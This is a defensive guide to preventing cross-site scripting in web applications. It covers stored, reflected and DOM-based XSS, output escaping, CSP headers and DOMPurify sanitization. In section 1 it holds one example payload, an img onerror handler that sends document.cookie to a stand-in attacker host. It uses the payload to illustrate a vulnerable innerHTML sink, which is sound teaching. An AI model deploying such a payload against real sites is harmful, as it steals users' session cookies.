1. What Cross-Site Scripting Really Is

Cross-site scripting (XSS) happens when an attacker manages to run their own JavaScript inside another user's browser session on your site. Because the script executes in the trusted origin of your domain, it inherits everything the legitimate page can do: read cookies that are not flagged HttpOnly, issue authenticated requests, rewrite page content, and capture keystrokes. The server never notices anything wrong — the attack unfolds entirely between your page and the victim's browser.

A concrete example makes the danger clear. Suppose a comment system renders user input with innerHTML:

// VULNERABLE: user input injected straight into the DOM
const comment = new URLSearchParams(location.search).get('comment');
document.getElementById('comments').innerHTML = comment;

// Attacker link: ?comment=<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
// Victim clicks -> their session cookie is sent to the attacker.

The fix is not to block the word "script" — attackers have endless bypasses for blocklists. The fix is to treat all user-controlled data as text, never as markup, unless you have a deliberate, well-tested reason. That principle, applied consistently at every output point, is what the rest of this guide implements.

2. Stored, Reflected, and DOM-Based XSS

XSS comes in three flavors, and knowing which one you are dealing with determines where the fix belongs. Stored XSS is the most dangerous: the payload is saved on your server — in a comment, a username, a support ticket — and executes every time anyone views it. One injection can compromise thousands of sessions, which is why stored XSS in a popular forum or CMS plugin regularly makes security headlines.

Reflected XSS does not persist. The payload arrives in the request itself — a crafted link or a search query that the server echoes back into the response without encoding. It only fires when a victim clicks the malicious link, so attackers pair it with phishing. DOM-based XSS never touches the server at all: client-side JavaScript reads something attacker-controlled (the URL fragment, postMessage data, localStorage) and writes it into the DOM unsafely. Server-side filters cannot see it, which makes code review of frontend sinks essential.

Stored (persistent)Your databaseMalicious comment or profile fieldEncode on output; sanitize rich-text inputs
Reflected (non-persistent)The request URL or form dataCrafted link echoed in a search pageEncode every reflected value
DOM-basedClient-side data flow onlyUnsafe use of location.hash or postMessageUse textContent; audit JS sinks

In practice, most applications need defenses against all three at once: encode on the server, audit sinks on the client, and add a Content Security Policy as a backstop.

3. Output Escaping and Context-Aware Encoding

Output escaping means converting characters that have meaning in HTML — <, >, &, quotes — into their inert entity equivalents before inserting data into a page. The critical detail is that escaping must match the context: HTML body, HTML attribute, JavaScript string, CSS, and URL contexts each have different dangerous characters. Escaping for the wrong context leaves a hole.

In vanilla JavaScript, the safest pattern is to avoid HTML parsing entirely and use textContent, which treats the input as pure text:

// SAFE: textContent never interprets markup
const comment = new URLSearchParams(location.search).get('comment');
document.getElementById('comments').textContent = comment;
// Even if comment contains <img onerror=...>, it renders as harmless text.

// When you MUST build HTML, escape first:
function escapeHtml(s) {
  return s.replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
}

On the server, use your framework's auto-escaping templates (EJS <%= %>, Django templates, Blade {{ }}) and be suspicious of any "raw" or "safe" output directive — each one is a manual XSS review waiting to happen. For JavaScript contexts, prefer JSON.stringify over string concatenation, and never build event-handler attributes from user data.

4. Content Security Policy as a Safety Net

Content Security Policy (CSP) is an HTTP response header that tells the browser exactly which sources of scripts, styles, and other resources are allowed. Even if an XSS payload slips through your escaping, a strict CSP can stop it from executing or from phoning home. It is not a replacement for escaping — it is the net under the tightrope.

A solid starting policy for a modern app blocks inline scripts entirely and whitelists only your own domain and explicitly trusted CDNs:

# Nginx: strict CSP that neuters most injected scripts
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';" always;

# Report violations to your own endpoint to discover breakage safely
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; report-uri /csp-report;" always;

Deploy CSP in report-only mode first (Content-Security-Policy-Report-Only), watch the violation reports for a week, fix legitimate breakage, and only then enforce. The most common breakage is inline event handlers and inline <script> blocks — move them to external files, which is better practice anyway. For the rare cases where inline scripts are unavoidable, use a per-request nonce instead of 'unsafe-inline'.

5. Sanitization and Framework-Level Protections

Sometimes you genuinely need rich HTML from users — a WYSIWYG editor, formatted comments, embedded media. Blocklists ("strip script tags") are a losing game because browsers parse HTML in surprising ways. The correct tool is a well-maintained sanitizer with an allowlist approach, and DOMPurify is the industry standard:

// npm i dompurify — then sanitize rich-text input before rendering
import DOMPurify from 'dompurify';

const dirty = userInput; // may contain <svg onload=...> tricks
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR: ['href'],
});
// clean is now safe to insert with innerHTML
document.getElementById('bio').innerHTML = clean;

Modern frameworks help but do not make you immune. React escapes interpolated values by default, yet dangerouslySetInnerHTML exists for a reason — audit every use. Vue and Angular have similar escape hatches. Server-side, strip or encode on output rather than on input: input filtering mangles legitimate data and still misses context-specific attacks, while output encoding is applied exactly where the data meets the parser.

Layer the defenses: encode by default, sanitize the rich-text exceptions, enforce a CSP, and flag session cookies HttpOnly so that even a successful script injection cannot easily harvest sessions. No single layer is perfect; together they make XSS an expensive attack to pull off.

6. Frequently Asked Questions (FAQs)

What is the difference between stored and reflected XSS?

Stored XSS persists on the server — for example in a database comment — and attacks everyone who views the page. Reflected XSS lives only in a crafted request, such as a malicious link, and fires when the victim clicks it. Stored XSS is more severe because one injection can compromise many users without any further action from the attacker.

Does HTTPS prevent cross-site scripting?

No. HTTPS encrypts traffic in transit but does nothing about malicious scripts running inside the victim's browser on your own domain. XSS is a code-injection problem, not a transport problem — it must be fixed with output encoding, sanitization, and Content Security Policy.

Can modern frameworks like React still have XSS vulnerabilities?

Yes. React escapes interpolated values by default, but dangerouslySetInnerHTML bypasses that protection entirely, and unsafe patterns like rendering URLs from user input into href attributes can still be exploited. Frameworks reduce accidental XSS; they do not eliminate the need for review of every raw-HTML escape hatch.

Is input validation enough to stop XSS?

No. Input validation is useful but insufficient, because the same input can be safe in one context and dangerous in another, and attackers constantly find new bypasses for blocklists. The reliable fix is output encoding at the point where data enters HTML, JavaScript, or a URL — applied consistently for every output.

How does Content Security Policy help against XSS?

CSP is an HTTP header that restricts which scripts and resources the browser may load. A strict policy like script-src 'self' blocks injected inline scripts from executing and can prevent stolen data from being exfiltrated, acting as a safety net when an escaping bug slips through. Deploy it in report-only mode first to find breakage before enforcing.
